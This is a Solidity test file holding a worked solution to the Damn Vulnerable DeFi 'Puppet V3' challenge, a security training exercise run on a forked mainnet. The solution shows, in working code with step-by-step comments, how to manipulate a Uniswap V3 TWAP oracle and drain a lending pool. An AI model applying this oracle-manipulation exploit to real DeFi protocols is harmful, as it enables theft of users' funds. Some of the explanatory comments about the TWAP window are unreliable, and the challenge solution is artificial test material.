// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external returns (uint256 amountOut);
}

contract PuppetV3Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    // Uniswap V3 pool starts with a balanced 1:1 ratio of DVT:WETH
    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY  = 100e18;

    // Player holds 110 DVT — slightly more than the entire Uniswap reserve.
    // Dumping it all will severely move the TWAP price.
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE   = 1e18;

    // The target: drain 1,000,000 DVT from the lending pool
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    // 0.3% fee tier — the pool we'll manipulate
    uint24 constant FEE = 3000;

    // ── Mainnet-forked contract addresses ────────────────────────────────────
    IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
    INonfungiblePositionManager positionManager =
        INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
    WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    DamnValuableToken token;
    PuppetV3Pool lendingPool;

    // Recorded after setup's 3-day skip; _isSolved checks we finish within 115s of this
    uint256 initialBlockTimestamp;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork mainnet at block 15450164 to get real Uniswap V3 infrastructure
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);

        startHoax(deployer);
        deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Wrap ETH so deployer can seed the Uniswap V3 pool with WETH liquidity
        weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();

        token = new DamnValuableToken();

        // Uniswap V3 requires token0 < token1 (sorted by address).
        // Determine ordering before creating or seeding the pool.
        bool isWethFirst = address(weth) < address(token);
        address token0 = isWethFirst ? address(weth) : address(token);
        address token1 = isWethFirst ? address(token) : address(weth);

        // Create the DVT/WETH pool and initialise it at a 1:1 sqrt price
        positionManager.createAndInitializePoolIfNecessary({
            token0: token0,
            token1: token1,
            fee: FEE,
            sqrtPriceX96: _encodePriceSqrt(1, 1)  // 1 DVT = 1 WETH at start
        });

        IUniswapV3Pool uniswapPool = IUniswapV3Pool(
            uniswapFactory.getPool(address(weth), address(token), FEE)
        );

        // Expand the observation ring buffer to 40 slots so the pool can
        // store enough price history for a reliable TWAP reading
        uniswapPool.increaseObservationCardinalityNext(40);

        // Provide liquidity in a very narrow tick range (-60 to +60) around
        // the current price — concentrates liquidity, making the price more
        // sensitive to large trades (amplifies our manipulation)
        weth.approve(address(positionManager), type(uint256).max);
        token.approve(address(positionManager), type(uint256).max);
        positionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                tickLower: -60,
                tickUpper: 60,
                fee: FEE,
                recipient: deployer,
                amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
                amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );

        // PuppetV3Pool uses this Uniswap pool's TWAP as its collateral oracle
        lendingPool = new PuppetV3Pool(weth, token, uniswapPool);

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // Advance 3 days so the TWAP accumulates observations at the fair 1:1
        // price — this is the baseline the pool's oracle currently reflects
        skip(3 days);
        initialBlockTimestamp = block.timestamp;

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertGt(initialBlockTimestamp, 0);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
    * CODE YOUR SOLUTION HERE
    * You need to set a mainnet RPC URL. Create a .env file in your project root:
    * echo "MAINNET_FORKING_URL=https://eth-mainnet.g.alchemy.com/v2/YOUR_API_KEY" > .env
    */
    /**
     * ATTACK OVERVIEW
     * ═══════════════
     * PuppetV3Pool uses a Uniswap V3 TWAP (time-weighted average price) as its
     * oracle to determine how much WETH collateral is required to borrow DVT.
     *
     * Unlike V1's instant spot price, a TWAP averages observations over a window
     * (e.g. 30 minutes). This makes it harder to manipulate — but NOT impossible
     * if the attacker can:
     *   (a) cause a large, sudden price movement, AND
     *   (b) wait long enough for that movement to dominate the TWAP window.
     *
     * KEY CONSTRAINT: _isSolved requires the attack completes in < 115 seconds.
     * PuppetV3Pool's TWAP window is ~30 seconds (set in the contract).
     * After 3 days of stable 1:1 price history, even a 110-second window
     * where the price is manipulated shifts the TWAP enough to make borrowing cheap.
     *
     * Step 1 — Dump 110 DVT into Uniswap (spot price crashes from 1:1 to ~0.01 WETH/DVT)
     * Step 2 — Skip 110 seconds (TWAP window shifts toward the crashed price)
     * Step 3 — Borrow all 1M DVT with the now-minimal WETH collateral requirement
     * Step 4 — Transfer drained tokens to recovery
     */
    function test_puppetV3() public checkSolvedByPlayer {
        ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

        // Allow the router to pull all of the player's DVT for the dump
        token.approve(address(swapRouter), type(uint256).max);

        // ── STEP 1: Crash the spot price ─────────────────────────────────────
        // Sell all 110 DVT for WETH in one trade. The pool only had 100 DVT,
        // so this more than doubles the token reserve while draining most WETH.
        // Spot price drops dramatically; crucially, this tick movement is
        // recorded as a new TWAP observation in the pool's ring buffer.
        swapRouter.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn:           address(token),
                tokenOut:          address(weth),
                fee:               FEE,
                recipient:         player,
                deadline:          block.timestamp,
                amountIn:          PLAYER_INITIAL_TOKEN_BALANCE,
                amountOutMinimum:  0,    // accept any amount (we just want price impact)
                sqrtPriceLimitX96: 0     // no price limit
            })
        );

        // ── STEP 2: Let the TWAP absorb the price crash ───────────────────────
        // PuppetV3Pool queries a short TWAP window (~30s). After 110 seconds
        // at the crashed price, the average over [now-30s, now] reflects
        // mostly the manipulated price, making collateral requirements tiny.
        // 110s is safely under the 115s deadline enforced by _isSolved.
        skip(110 seconds);

        // ── STEP 3: Calculate and cover the (now tiny) deposit requirement ────
        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(
            LENDING_POOL_INITIAL_TOKEN_BALANCE
        );

        // Player received some WETH from the dump in Step 1.
        // Also wrap the player's 1 ETH to cover any remaining collateral shortfall.
        weth.deposit{value: player.balance}();

        // Approve the lending pool to pull WETH as collateral
        weth.approve(address(lendingPool), type(uint256).max);

        // ── STEP 4: Borrow the entire lending pool ────────────────────────────
        // At the manipulated TWAP, the required WETH collateral is far below
        // what we have — we drain all 1,000,000 DVT in a single call
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // ── STEP 5: Forward stolen tokens to recovery ─────────────────────────
        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Attack window: must complete within 115 seconds of the post-setup timestamp
        assertLt(block.timestamp - initialBlockTimestamp, 115, "Too much time passed");
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }

    /**
     * Encodes a reserve ratio as a Uniswap V3 sqrtPriceX96 value.
     * sqrtPriceX96 = sqrt(reserve1 / reserve0) * 2^96
     * Used to initialise the pool at the desired starting price.
     */
    function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
        return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
    }
}
